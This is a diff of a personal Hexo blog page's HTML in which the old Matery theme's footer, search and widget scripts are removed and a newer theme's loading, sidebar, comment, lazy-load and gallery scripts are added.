+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
 
-
-<!-- 代码语言 -->
-
-
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget card" style="background-color: white;">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
-        </div>
-    </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
-    </a>
-</div>
-
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
 <script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('3'),
-            headingSelector: 'h2, h3, h4, h5, h6'
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.28.1" async></script>
+
+<!-- optional -->
+
+  <script>
+    function load_twikoo() {
+        if (!document.querySelectorAll("#twikoo_container")[0]) return;
+        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
+            const el = document.getElementById("twikoo_container");
+            var path = el.getAttribute('comment_id');
+            if (!path) {
+                path = decodeURI(window.location.pathname);
+            }
+            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
+                el: '#twikoo_container',
+                path: path,
+            }));
         });
+    }
 
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
+    window.addEventListener('DOMContentLoaded', (event) => {
+        load_twikoo();
     });
 </script>
 
-    
-
-</main>
 
 
-
-
-    <footer class="page-footer bg-color">
-    
-
-    <div class="container row center-align"
-         style="margin-bottom: 0px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            
-                <span id="year">2019-2024</span>
-            
-            <a href="/about" target="_blank">hybcx</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            
-            <br>
-            
-                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">861.1k</span>
-            
-            
-            
-            
-                <span id="busuanzi_container_site_pv">
-                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
-                    <span id="busuanzi_value_site_pv" class="white-color"></span>
-            </span>
-            
-            
-                <span id="busuanzi_container_site_uv">
-                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
-                    <span id="busuanzi_value_site_uv" class="white-color"></span>
-            </span>
-            
-            <br>
-
-            <!-- 运行天数提醒. -->
-            
-            <br>
-            
-        </div>
-        <div class="col s12 m4 l4 social-link ">
-    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fab fa-github"></i>
-    </a>
-
-
-
-    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
-
-
-
-    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
-        <i class="fab fa-facebook-f"></i>
-    </a>
-
-
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
-
-</div>
-    </div>
-</footer>
-
-<div class="progress-bar"></div>
-
-
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
-        </div>
-        <div id="searchResult"></div>
-    </div>
-</div>
-
-<script type="text/javascript">
-$(function () {
-    var searchFunc = function (path, search_id, content_id) {
-        'use strict';
-        $.ajax({
-            url: path,
-            dataType: "xml",
-            success: function (xmlResponse) {
-                // get the contents from search data
-                var datas = $("entry", xmlResponse).map(function () {
-                    return {
-                        title: $("title", this).text(),
-                        content: $("content", this).text(),
-                        url: $("url", this).text()
-                    };
-                }).get();
-                var $input = document.getElementById(search_id);
-                var $resultContent = document.getElementById(content_id);
-                $input.addEventListener('input', function () {
-                    var str = '<ul class=\"search-result-list\">';
-                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-                    $resultContent.innerHTML = "";
-                    if (this.value.trim().length <= 0) {
-                        return;
-                    }
-                    // perform local searching
-                    datas.forEach(function (data) {
-                        var isMatch = true;
-                        var data_title = data.title.trim().toLowerCase();
-                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
-                        var data_url = data.url;
-                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
-                        var index_title = -1;
-                        var index_content = -1;
-                        var first_occur = -1;
-                        // only match artiles with not empty titles and contents
-                        if (data_title !== '' && data_content !== '') {
-                            keywords.forEach(function (keyword, i) {
-                                index_title = data_title.indexOf(keyword);
-                                index_content = data_content.indexOf(keyword);
-                                if (index_title < 0 && index_content < 0) {
-                                    isMatch = false;
-                                } else {
-                                    if (index_content < 0) {
-                                        index_content = 0;
-                                    }
-                                    if (i === 0) {
-                                        first_occur = index_content;
-                                    }
-                                }
-                            });
-                        }
-                        // show search results
-                        if (isMatch) {
-                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
-                            var content = data.content.trim().replace(/<[^>]+>/g, "");
-                            if (first_occur >= 0) {
-                                // cut out 100 characters
-                                var start = first_occur - 20;
-                                var end = first_occur + 80;
-                                if (start < 0) {
-                                    start = 0;
-                                }
-                                if (start === 0) {
-                                    end = 100;
-                                }
-                                if (end > content.length) {
-                                    end = content.length;
-                                }
-                                var match_content = content.substr(start, end);
-                                // highlight all keywords
-                                keywords.forEach(function (keyword) {
-                                    var regS = new RegExp(keyword, "gi");
-                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
-                                });
-
-                                str += "<p class=\"search-result\">" + match_content + "...</p>"
-                            }
-                            str += "</li>";
-                        }
-                    });
-                    str += "</ul>";
-                    $resultContent.innerHTML = str;
-                });
-            }
-        });
-    };
-
-    searchFunc('/search.xml', 'searchInput', 'searchResult');
-});
-</script>
-
-    <!-- 白天和黑夜主题 -->
-<div class="stars-con">
-    <div id="stars"></div>
-    <div id="stars2"></div>
-    <div id="stars3"></div>  
-</div>
-
-<script>
-    function switchNightMode() {
-        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
-        setTimeout(function () {
-            $('body').hasClass('DarkMode') 
-            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
-            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
-            
-            setTimeout(function () {
-            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
-                $(this).remove()
-            })
-            }, 2e3)
-        })
-    }
-</script>
-
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
-</div>
-
-
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
-
-    
-
-    
-    
-    
-        
-        <script type="text/javascript">
-            // 只在桌面版网页启用特效
-            var windowWidth = $(window).width();
-            if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
-            }
-        </script>
-    
-
-    <!-- 雪花特效 -->
-    
-
-    <!-- 鼠标星星特效 -->
-    
-
-     
-        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
-        <script src="/libs/others/TencentCaptcha.js"></script>
-        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
-    
-
-    <!-- Baidu Analytics -->
-
-    <!-- Baidu Push -->
-
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
         }
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
-    
-    
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js"></script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const slideUp = {
+      distance: `16px`,
+      duration: `800`,
+      interval: `100`,
+      scale: `1`,
+      opacity: 0,
+      easing: "ease-out"
+    };
+    ScrollReveal().reveal('.l_left .slide-up', slideUp);
+    ScrollReveal().reveal('.l_main .slide-up', slideUp);
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
 
-    
-        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
-        <script>
-            $(document).ready(function () {
-                setInterval(change_Tidio, 50);
-                function change_Tidio() {
-                    var tidio=$("#tidio-chat iframe");
-                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
-                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
-                        document.getElementById("tidio-chat-iframe").style.right="-15px";
-                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
-                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
-                    }
-                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
-                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
-                        document.getElementById("tidio-chat-iframe").style.right="-15px";
-                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
-                    }
-                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
-                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
-                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
-                    }
-                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
-                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
-                    }
-                }
-            });
-        </script>
-    
 
-    
-
-    <!--腾讯兔小巢-->
-    
-    
-
-    
-
-    
-
-    
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
-    
-
-</body>
-
-</html>
+<!-- inject -->
+<script type="text/javascript" src="/custom/js/ZYDark.js"></script>
+</div></body></html>
